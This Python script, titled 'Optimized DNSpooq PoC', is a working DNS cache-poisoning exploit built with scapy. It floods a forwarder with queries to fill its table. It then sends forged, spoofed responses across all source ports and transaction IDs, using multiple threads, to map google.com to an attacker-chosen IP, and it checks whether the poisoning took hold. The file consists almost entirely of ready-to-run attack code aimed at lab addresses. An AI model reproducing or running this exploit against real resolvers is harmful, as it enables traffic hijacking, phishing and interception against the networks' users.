#!/usr/bin/python

import time
import socket
import struct
import sys
import threading
import random
from scapy.all import *

# Configuration
INTERFACE = "eth0"
FORWARDER_IP = "10.10.0.2"
CACHE_IP = "10.10.0.4"
POISON_IP = "10.10.0.5"

# Attack parameters
FORWARD_TABLE_SIZE = 2000
QUERY_NAME = "example.com"
TARGET_NAME = "google.com"
NUM_THREADS = 8

def patch(dns_frame: bytearray, pseudo_hdr: bytes, dns_id: int, dport: int):
    """Patch DNS frame with new transaction ID and destination port"""
    dns_frame[36] = (dport >> 8) & 0xFF
    dns_frame[37] = dport & 0xFF
    dns_frame[42] = (dns_id >> 8) & 0xFF
    dns_frame[43] = dns_id & 0xFF
    dns_frame[40] = 0x00
    dns_frame[41] = 0x00
    
    ck = checksum(pseudo_hdr + dns_frame[34:])
    if ck == 0:
        ck = 0xFFFF
    cs = struct.pack("!H", ck)
    dns_frame[40] = cs[0]
    dns_frame[41] = cs[1]

# Global state
success = False
packets_sent = 0
lock = threading.Lock()
start_time = None

def attack_worker(base_frame, pseudo_hdr, ports, thread_id):
    """Optimized worker with better port distribution"""
    global success, packets_sent
    
    s2 = conf.L2socket(iface=INTERFACE)
    local_packets = 0
    
    # Randomize port order for better distribution
    port_list = list(ports)
    random.shuffle(port_list)
    
    for sport in port_list:
        if success:
            break
            
        # Try all TXIDs
        for txid in range(65536):
            if success:
                break
                
            dns_frame = bytearray(base_frame)
            patch(dns_frame, pseudo_hdr, txid, sport)
            s2.send(dns_frame)
            local_packets += 1
            
            # Periodic updates
            if local_packets % 5000 == 0:
                with lock:
                    packets_sent += local_packets
                    local_packets = 0
                    
                # Progress check (thread 0 only)
                if thread_id == 0 and packets_sent % 50000 == 0:
                    elapsed = time.time() - start_time
                    rate = packets_sent / elapsed
                    print(f"\r[*] Packets: {packets_sent:,} | Rate: {rate:,.0f} pkt/s | Time: {elapsed:.1f}s", end='')
                    
                    # Check success
                    verify = IP(dst=FORWARDER_IP) / UDP(dport=53) / \
                            DNS(rd=1, qd=DNSQR(qname=TARGET_NAME, qtype="A", qclass='IN'))
                    res = sr1(verify, verbose=0, iface=INTERFACE, timeout=0.01)
                    
                    if res and res.haslayer(DNSRR):
                        for i in range(res[DNS].ancount):
                            if res[DNS].an[i].type == 1 and res[DNS].an[i].rdata == POISON_IP:
                                print(f"\n\n[!] SUCCESS! Port: {sport}, TXID: {txid}")
                                print(f"[!] {TARGET_NAME} -> {POISON_IP}")
                                print(f"[!] Time: {elapsed:.1f}s, Packets: {packets_sent:,}")
                                success = True
                                break
    
    with lock:
        packets_sent += local_packets
    s2.close()

print("="*60)
print("Optimized DNSpooq PoC")
print("="*60)
print(f"Target: {QUERY_NAME} -> {TARGET_NAME} -> {POISON_IP}")
print(f"Threads: {NUM_THREADS}")
print("="*60 + "\n")

# Phase 1: Fill forwarding table
print(f"[Phase 1] Filling forwarding table ({FORWARD_TABLE_SIZE} queries)...")
s3 = conf.L3socket(iface=INTERFACE)
qd = DNSQR(qname=QUERY_NAME, qtype="A", qclass='IN')
req = IP(dst=FORWARDER_IP) / UDP(dport=53) / DNS(id=0, rd=1, qd=qd)
dns_layer = req[DNS]

for i in range(FORWARD_TABLE_SIZE):
    dns_layer.id = i
    s3.send(req)
    if i % 500 == 0:
        print(f"  {i}/{FORWARD_TABLE_SIZE}")

s3.close()

# Phase 2: Minimal wait
print("\n[Phase 2] Starting attack immediately...")
time.sleep(0.2)  # Minimal delay

# Phase 3: Attack
print("\n[Phase 3] Launching parallel attack...")

# Prepare response
res = Ether() / \
      IP(src=CACHE_IP, dst=FORWARDER_IP) / \
      UDP(sport=53, dport=0) / \
      DNS(id=0, qr=1, ra=1, qd=qd,
          an=DNSRR(rrname=QUERY_NAME, ttl=900, rdata=TARGET_NAME, type="CNAME", rclass="IN") /
             DNSRR(rrname=TARGET_NAME, ttl=900, rdata=POISON_IP, type="A", rclass="IN"))

base_frame = bytearray(raw(res))
pseudo_hdr = struct.pack(
    "!4s4sHH",
    inet_pton(socket.AF_INET, res["IP"].src),
    inet_pton(socket.AF_INET, res["IP"].dst),
    socket.IPPROTO_UDP,
    len(base_frame[34:]),
)

# Distribute ports among threads
all_ports = list(range(1024, 65535))
ports_per_thread = len(all_ports) // NUM_THREADS

threads = []
start_time = time.time()

for i in range(NUM_THREADS):
    start_idx = i * ports_per_thread
    end_idx = start_idx + ports_per_thread if i < NUM_THREADS - 1 else len(all_ports)
    thread_ports = all_ports[start_idx:end_idx]
    
    t = threading.Thread(
        target=attack_worker,
        args=(base_frame, pseudo_hdr, thread_ports, i)
    )
    t.start()
    threads.append(t)

# Wait for completion
try:
    for t in threads:
        t.join()
except KeyboardInterrupt:
    print("\n[*] Interrupted")
    success = True

# Final stats
elapsed = time.time() - start_time
print(f"\n\n[*] Final Statistics:")
print(f"    Total time: {elapsed:.1f} seconds")
print(f"    Total packets: {packets_sent:,}")
print(f"    Average rate: {packets_sent/elapsed:,.0f} pkt/s")

if success:
    print("\n[+] Attack SUCCESSFUL!")
else:
    print("\n[-] Attack failed")

print("[*] Done.")